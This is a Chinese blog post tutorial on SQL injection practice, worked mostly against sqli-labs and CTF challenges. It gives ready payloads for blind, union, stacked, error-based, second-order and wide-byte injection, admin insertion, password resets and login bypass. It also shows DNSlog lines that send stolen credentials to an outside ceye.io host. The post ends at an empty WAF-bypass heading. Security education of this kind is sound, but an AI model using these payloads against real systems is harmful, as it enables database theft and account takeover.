<!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.8.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"بحث...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
<meta name="description" content="前言  SQL注入不是一个过期的安全问题，恰恰相反,它是一种非常容易被使用的攻击方式，SQL注入并不需要高深的攻击手段便可以轻易使敏感的数据库信息被非法浏览或删除。本节的情况在大部分开发者有了安全意识后仍广泛存在，主要原因是开发者在编写系统框架时无法使用预编译的办法处理这类参数。事实上，只要对输入的值进行白名单比对，基本上就能防御这种注入。">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL注入实践">
<meta property="og:url" content="http://example.com/2022/02/02/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E8%B7%B5/index.html">
<meta property="og:site_name" content="mayylu">
<meta property="og:description" content="前言  SQL注入不是一个过期的安全问题，恰恰相反,它是一种非常容易被使用的攻击方式，SQL注入并不需要高深的攻击手段便可以轻易使敏感的数据库信息被非法浏览或删除。本节的情况在大部分开发者有了安全意识后仍广泛存在，主要原因是开发者在编写系统框架时无法使用预编译的办法处理这类参数。事实上，只要对输入的值进行白名单比对，基本上就能防御这种注入。">
<meta property="og:locale">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/IMG_20220202_163118.jpg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220713122252.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/20190428092707787.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/img_202215454843.jpg">
<meta property="article:published_time" content="2022-02-02T06:34:33.000Z">
<meta property="article:modified_time" content="2022-10-03T11:37:21.797Z">
<meta property="article:author" content="mayylu">
<meta property="article:tag" content="SQL">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/IMG_20220202_163118.jpg">


<link rel="canonical" href="http://example.com/2022/02/02/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E8%B7%B5/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-Hans","comments":true,"permalink":"http://example.com/2022/02/02/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E8%B7%B5/","path":"2022/02/02/SQL注入实践/","title":"SQL注入实践"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>SQL注入实践 | mayylu</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="تشغيل شريط التصفح" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">mayylu</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>







</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          المحتويات
        </li>
        <li class="sidebar-nav-overview">
          عام
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95"><span class="nav-number">2.</span> <span class="nav-text">攻击手法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WAF-%E7%BB%95%E8%BF%87"><span class="nav-number">3.</span> <span class="nav-text">WAF 绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLMAP%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">SQLMAP的使用</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">mayylu</p>
  <div class="site-description" itemprop="description">关注生活的点点滴滴</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">14</span>
          <span class="site-state-item-name">المقالات</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">الوسوم</span>
      </div>
  </nav>
</div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/02/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E8%B7%B5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="mayylu">
      <meta itemprop="description" content="关注生活的点点滴滴">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="mayylu">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          SQL注入实践
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">نُشر في</span>

      <time title="أُنشأ: 2022-02-02 14:34:33" itemprop="dateCreated datePublished" datetime="2022-02-02T14:34:33+08:00">2022-02-02</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">عُدل في</span>
        <time title="عُدل: 2022-10-03 19:37:21" itemprop="dateModified" datetime="2022-10-03T19:37:21+08:00">2022-10-03</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  SQL注入不是一个过期的安全问题，恰恰相反,它是一种非常容易被使用的攻击方式，SQL注入并不需要高深的攻击手段便可以轻易使敏感的数据库信息被非法浏览或删除。本节的情况在大部分开发者有了安全意识后仍广泛存在，主要原因是开发者在编写系统框架时无法使用预编译的办法处理这类参数。事实上，只要对输入的值进行白名单比对，基本上就能防御这种注入。<br>  <span id="more"></span><br><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/IMG_20220202_163118.jpg" alt="IMG_20220202_163118">   </p>
<ul>
<li><p>使用#号(php注释)<br>有时发现执行的sql语句中没有#号<br>原因是url中#号是用来指导浏览器动作的（例如锚点），对服务器端完全无用。所以，HTTP请求中不包括#,将#号改成url的编码%23就可以了</p>
</li>
<li><p>使用–+<br>这里发现＋号在语句中变成了空格(在传输过程中空格会被忽略)。用来和后面的单引号分隔开，将后面的语句注释。<br>了解原理后便知道了–无法使用的原因，–直接和系统自动生成的单引号连接在了一起，会被认为是一个关键词，无法注释掉系统自动生成的单引号。所以在注入时我们除了使用–+外，也可以使用–’来完成sql注入语句</p>
</li>
</ul>
<h2 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h2><ol>
<li>基于布尔的盲注<br>因为web的页面返回值都是True或者False，所以布尔盲注就是注入后根据页面返回值来得到数据库信息的一种办法。    <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">1.判断数据库的类型</span><br><span class="line">//判断是否是 Mysql数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from information_schema.tables) --+</span><br><span class="line">//判断是否是 access数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from msysobjects) --+</span><br><span class="line">//判断是否是 Sqlserver数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from sysobjects) --+</span><br><span class="line"></span><br><span class="line">2：判断当前数据库名的长度，利用二分法</span><br><span class="line">?id=1&#x27; and length(database())&gt;5 --+</span><br><span class="line"> </span><br><span class="line">3：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断</span><br><span class="line">//判断数据库的第一个字符</span><br><span class="line">id=1&#x27; and ascii(substr(database(),1,1))&gt;115 --+ //100为ascii表中的十进制，对应字母s</span><br><span class="line">//判断数据库的第二个字符</span><br><span class="line">id=1&#x27; and ascii(substr(database(),2,1))&gt;100 --+</span><br><span class="line">//判断数据库的第三个字符</span><br><span class="line">id=1&#x27; and ascii(substr(database(),3,1))&gt;100 --+</span><br><span class="line"></span><br><span class="line">由此可以判断出当前数据库为 security</span><br><span class="line"></span><br><span class="line">//猜测当前数据库中是否存在admin表</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from admin) --+</span><br><span class="line">..................................</span><br><span class="line">4：判断当前数据库中表的个数</span><br><span class="line">// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4</span><br><span class="line">id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;3 --+</span><br><span class="line">5：判断每个表的长度</span><br><span class="line">?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1))&gt;5--+</span><br><span class="line">6：判断每个表的每个字符的ascii值</span><br><span class="line">?id=1&#x27; and ascii(SUBSTR((select table_name from information_schema.tables where table_schema= &#x27;security&#x27; limit 1),1,1))&gt;100 --+</span><br><span class="line">................................</span><br><span class="line">7: 判断表中字段的个数</span><br><span class="line"></span><br><span class="line">8：判断每个字段的长度</span><br><span class="line"></span><br><span class="line">9：判断第一个字段的ascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">10: 判断数据的长度</span><br><span class="line"></span><br><span class="line">11：判断数据的ascii值</span><br></pre></td></tr></table></figure></li>
<li>基于时间的盲注     </li>
</ol>
<p><strong>当布尔型注入没有结果（页面显示正常）的时候</strong>，我们很难判断注入的代码是否被执行，也可以说到底这个注入点存不存在？这个时候布尔型注入就无法发挥自己的作用了。基于时间的盲注便应运而生，所谓基于时间的盲注，就是我们根据web页面相应的时间差来判断该页面是否存在SQL注入点。<br>如：<br><code>?id=1&#39; and if(ascii(substr(database(),2,1))= 101,sleep(5),0) --+</code></p>
<ol start="3">
<li>联合查询注入<br>所谓联合查询注入即是使用union<strong>合并两个或多个SELECT语句的结果集</strong>，所以每个 SELECT 语句必须有<strong>相同数量的列</strong>、且各列的<strong>数据类型</strong>也都相同。同时，每个 SELECT 语句中的<strong>列的顺序</strong>必须相同。联合查询注入可在链接最后添加order by 9基于随意数字的注入，根据页面的返回结果来判断站点中的字段数目。</li>
</ol>
<p>select直接加<strong>数字串</strong>时，可以不写后面的表名，那么它输出的内容就是我们select后的数字，这时我们写的一串数字就是一个数组（或1个行向量），这时select实际上没有向任何一个数据库查询数据，即查询命令不指向任何数据库的表。返回值就是我们输入的这个数组，这时它是个1行n列的表，表的<strong>列名和值</strong>都是我们输入的数组<br><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220713122252.png" alt="QQ截图20220713122252"> </p>
<p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/20190428092707787.png" alt="20190428092707787"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; order by 3 --+  #判断字段数</span><br><span class="line">id=-1 union select 1,2,3 --+ #判断回显位</span><br><span class="line">id=-1&#x27; union select 1,database(),user() --+  #查询库名与用户</span><br><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+  #查表</span><br><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; --+ #查字段</span><br><span class="line">?id=-1&#x27; union select 1,group_concat(Id,&#x27;--&#x27;,username,&#x27;--&#x27;,password),3 from users --+ #爆值</span><br><span class="line"></span><br><span class="line">利用回显位读取文件</span><br><span class="line">?no=0/**/union/**/select/**/1,load_file(&quot;/var/www/html/flag.php&quot;),3,4#</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>堆叠注入<br>使用mysqli对象中的query()方法每次调用只能执行一条SQL命令。使用mysqli对象中的 multi_query()方法可以一次执行多条SQL命令，在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，这个想法也就造就了堆叠注入。union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以<strong>执行的是任意的语句</strong>。<br>如：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;;update users set password=&#x27;123456&#x27; where id=1; --+ </span><br><span class="line"></span><br><span class="line">select被过滤可以考虑使用show显示表名和列名</span><br><span class="line">http://ip:port/?inject= &#x27;;show databases;show tables;show columns from table;</span><br></pre></td></tr></table></figure></li>
<li>基于错误信息的注入<br>此方法是在页面没有显示位，但是echo mysql_error();函数输出了错误信息的时候方能使用。优点是注入速度快，缺点是语句较为复杂，而且只能用limit依次进行猜解。总体来说，报错注入其实是一种公式化的注入方法，主要用于在页面中没有显示位，但是用echo mysql_error();输出了错误信息时使用。 </li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select 1 from (select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and extractvalue(1,concat(&#x27;^&#x27;,(select database()),&#x27;^&#x27;)) --+</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and updatexml(1,concat(&#x27;^&#x27;,(database()),&#x27;^&#x27;),1) --+</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">## 注入点</span><br><span class="line"></span><br><span class="line">注入点本节将从SQL语句的语法角度，从不同的注入点位置讲述SQL注入的技巧。 </span><br><span class="line"></span><br><span class="line">1.2.1 SELECT注入    </span><br><span class="line"></span><br><span class="line">SELECT语句用于数据表记录的查询，常在界面展示的过程使用，如新闻的内容、界面的展示等。SELECT语句的语法如下：   </span><br><span class="line">![微信图片_20220218162724](https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/微信图片_20220218162724.jpg)   </span><br><span class="line">1．注入点在select_expr     </span><br><span class="line">此时可以采取时间盲注进行数据获取，不过根据MySQL的语法，我们有更优的方法，即利用AS别名的方法，直接将查询的结果显示到界面中。访问链接</span><br><span class="line">`http://192.168.20.133/sqln1.php？id=（select%20pwd%20from%20wp_user）%20as%20title`      </span><br><span class="line">2．注入点在table_reference     </span><br><span class="line">我们仍可以用别名的方式直接取出数据，如</span><br><span class="line">`select title from (select pwd as title from wp_user)x`   </span><br><span class="line">当然，在不知表名的情况下，可以先从information_schema.tables中查询表名。  </span><br><span class="line">在select_expr和table_reference的注入，如果注入的点有反引号包裹，那么需要先闭合反引号。可以在自己本地测试具体语句。  </span><br><span class="line">3．注入点在WHERE或HAVING后       </span><br><span class="line">这种情况已经在注入基础中讲过，也是现实中最常遇到的情况，要先判断有无引号包裹，再闭合前面可能存在的括号，即可进行注入来获取数据。注入点在HAVING后的情况与之相似。     </span><br><span class="line">4．注入点在GROUP BY或ORDER BY后       </span><br><span class="line">当遇到不是WHERE后的注入点时，先在本地的MySQL中进行尝试，看语句后面能加什么，从而判断当前可以注入的位置，进而进行针对性的注入。假设代码如下： </span><br><span class="line">`select title from news group by $(_get[&#x27;title&#x27;])`    </span><br><span class="line">经过测试可以发现，title=id desc，（if（1，sleep（1），1））会让页面迟1秒，于是可以利用时间注入获取相关数据。     </span><br><span class="line">5．注入点在LIMIT后       </span><br><span class="line">LIMIT后的注入判断比较简单，通过更改数字大小，页面会显示更多或者更少的记录数。由于语法限制，前面的字符注入方式不可行（LIMIT后只能是数字），在整个SQL语句没有ORDER BY关键字的情况下，可以直接使用UNION注入。另外，我们可根据SELECT语法，通过加入PROCEDURE来尝试注入，这类语句只适合MySQL 5.6前的版本。同样可以基于时间注入，语句如下：  </span><br><span class="line">![微信图片_20220218170730](https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/微信图片_20220218170730.jpg)   </span><br><span class="line">BENCHMARK语句的处理时间大约是1秒。在有写入权限的特定情况条件下，我们也可以使用INTO OUTFILE语句向Web目录写入webshell，在无法控制文件内容的情况下，可通过</span><br><span class="line">`SELECT xx INTO outfile&quot;/tmp/xxx.php&quot;LINES TERMINATED BY`   </span><br><span class="line">的方式控制部分内容     </span><br><span class="line"></span><br><span class="line">1.2.2 INSERT注入    </span><br><span class="line"></span><br><span class="line">INSERT语句是插入数据表记录的语句，网页设计中常在添加新闻、用户注册、回复评论的地方出现。      </span><br><span class="line">通常，注入位于字段名或者字段值的地方，且没有回显信息。   </span><br><span class="line">1．注入点位于tbl_name    </span><br><span class="line">如果能够通过注释符注释后续语句，则可直接插入特定数据到想要的表内，如管理员表。例如，对于如下SQL语句：  </span><br><span class="line">`insert into &#123;$_get[&#x27;table&#x27;]&#125; values(2,2,2,2)`    </span><br><span class="line">开发者预想的是，控制table的值为wp_news，从而插入新闻表数据。由于可以控制表名，我们可以访问`http://192.168.20.132/insert.php？table=wp_user values（2，&#x27;newadmin&#x27;，&#x27;newpass&#x27;）%23`，可以看到，已经成功地插入了一个新的管理员。   </span><br><span class="line">2．注入点位于VALUES    </span><br><span class="line">假设语句如下： </span><br><span class="line">`insert info wp_user values(1,1,&#x27;可控位置&#x27;)`</span><br><span class="line">此时可先闭合单引号，然后另行插入一条记录，通常管理员和普通用户在同一个表，此时便可以通过表字段来控制管理员权限。注入语句如下：</span><br><span class="line">`insert info wp_user values(1,1,&#x27;1&#x27;),(2,1,&#x27;a&#x27;)`</span><br><span class="line">如果用户表的第2个字段代表的是管理员权限标识，便能插入一个管理员用户。在某些情况下，我们也可以将数据插入能回显的字段，来快速获取数据。假设最后一个字段的数据会被显示到页面上，那么采用如下语句注入，即可将第一个用户的密码显示出来：</span><br><span class="line">`insert info wp_user values(1,1,&#x27;1&#x27;),(2,1,(select pwd from wp_user limit 1))`   </span><br><span class="line"></span><br><span class="line">1.2.3 UPDATE注入      </span><br><span class="line"></span><br><span class="line">UPDATE语句适用于数据库记录的更新，如用户修改自己的文章、介绍信息、更新信息等。  </span><br><span class="line">当id数据可控时，则可修改多个字段数据，形如</span><br><span class="line">`update wp_user set id=3,user=&#x27;xxx&#x27; were user = &#x27;123&#x27;`</span><br><span class="line">其余位置的注入点利用方式与SELECT注入类似，这里不再赘述。    </span><br><span class="line"></span><br><span class="line">1.2.4 DELETE注入      </span><br><span class="line"></span><br><span class="line">DELETE注入大多在WHERE后。假设SQL语句如下：    </span><br><span class="line">`delete from wp_new where id =&#123;$_get[&#x27;id&#x27;]&#125;`   </span><br><span class="line">DELETE语句的作用是删除某个表的全部或指定行的数据。对id参数进行注入时，稍有不慎就会使WHERE后的值为True，导致整个wp_news的数据被删除,       </span><br><span class="line">为了保证不会对正常数据造成干扰，通常使用&#x27;and sleep（1）&#x27;的方式保证WHERE后的结果返回为False，让语句无法成功执行，见图1-2-43。后续步骤与1.2.2节的时间盲注的一致，这里不再赘述。</span><br><span class="line"></span><br><span class="line">## 其他注入方法与技巧   </span><br><span class="line"></span><br><span class="line">1. 二次注入</span><br><span class="line">二次注入漏洞在CTF中常见于留言板和注册登录功能,简单来说可以分为两个步骤:</span><br><span class="line"></span><br><span class="line">UPDATE插入恶意数据(发布帖子,注册修改账号),用mysql_escape_string()函数对恶意字符进行**转义**,但是再将数据写入数据库中的时候又保留了原来的数据.</span><br><span class="line">引用插入的恶意数据:在进行查询时,直接从数据库中引用恶意数据,没有做进一步过滤和检验.</span><br></pre></td></tr></table></figure>
<ul>
<li>提前写入sql语句在查询时触发(例题[SWPU2019]Web1)<br>实战   万能密码<br>and的优先级大于or<br>当你的身份为 admin’ or ‘1’=’1<br>select * from users where username=’admin’ or ‘1’=’1’ and password=’fsdfs’<br>当你的密码为 sdfsd’ or ‘1’=’1<br>select * from users where username=’admin’ and password=’sdfsd’ or ‘1’=’1’</li>
</ul>
<ul>
<li>覆盖原有数据<br>实战   sql-lib 24     </li>
</ul>
<p>1.在创建用户界面 创建 admin’#  123 账号<br>2.登录  admin ‘#  123 账号<br>3.修改admin’#密码为  123456<br>UPDATE users SET PASSWORD=’123456’ where username=’admin’#’ and password=’$curr_pass’<br>发现 admin 密码变为123456</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">2. 宽字节注入  </span><br><span class="line">GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际为两字节   </span><br><span class="line">MySQL在使用**GBK**编码的时候，会认为两个字符为一个汉字</span><br><span class="line">```    </span><br><span class="line">输入     %df&#x27;    </span><br><span class="line">处理为   %df\&#x27;   </span><br><span class="line">编码为   %df%5c%27    </span><br><span class="line">带入sql  id=運&#x27; and   可以注入  </span><br><span class="line">```   </span><br><span class="line">3. DNSlog注入     </span><br><span class="line">实战场景 ：  sqllib less-10    </span><br><span class="line">```   </span><br><span class="line">爆字段</span><br><span class="line">http://localhost/www.sql.com/Less-10/?id=1&quot; and load_file(concat(&#x27;\\\\&#x27;,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),&#x27;.mysql.0e6xsd.ceye.io\\abc&#x27;)) --+</span><br><span class="line">爆字段值</span><br><span class="line">http://localhost/www.sql.com/Less-10/?id=1&quot; and load_file(concat(&#x27;\\\\&#x27;,(select concat(username,&#x27;abc&#x27;,password) from users limit 3,1),&#x27;.mysql.0e6xsd.ceye.io\\abc&#x27;)) --+</span><br><span class="line">http://localhost/www.sql.com/Less-10/?id=1&quot; and load_file(concat(&#x27;\\\\&#x27;,(select hex(concat_ws(&#x27;~&#x27;,username,password)) from users limit 3,1),&#x27;.mysql.0e6xsd.ceye.io\\abc&#x27;)) --+</span><br></pre></td></tr></table></figure>
<ol start="4">
<li><p>无列名注入<br>information_schema数据库是mysql中的信息数据库，它保存着mysql所有其他数据库的信息，包括了数据库名，表名，字段名等，但是如果waf过滤的这个数据库呢<br>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql.innodb_table_stats</span><br><span class="line"></span><br><span class="line">-1&#x27;union select 1，(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()),3--+</span><br><span class="line"></span><br><span class="line">schema_auto_increment_columns </span><br><span class="line"> </span><br><span class="line">http://xxxx?id=-1&#x27; union all select 1,2,group_concat(table_name)from sys.schema_auto_increment_columns where table_schema=database()--+//可以获取表名，也可以获取库名</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>利用uoion和as自定义列名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select a.3 from (select 1,2,3 union select * from users) as a;</span><br><span class="line">+------------+</span><br><span class="line">| 3          |</span><br><span class="line">+------------+</span><br><span class="line">| 3          |</span><br><span class="line">| ssss       |</span><br><span class="line">| admin      |</span><br><span class="line">| admin1     |</span><br><span class="line">| admin2     |</span><br><span class="line">+------------+</span><br><span class="line"></span><br><span class="line">select group_concat(a) from(select 1 as s,2 as a,3 as b union select * from users)as m;</span><br></pre></td></tr></table></figure>
<h2 id="WAF-绕过"><a href="#WAF-绕过" class="headerlink" title="WAF 绕过"></a>WAF 绕过</h2></li>
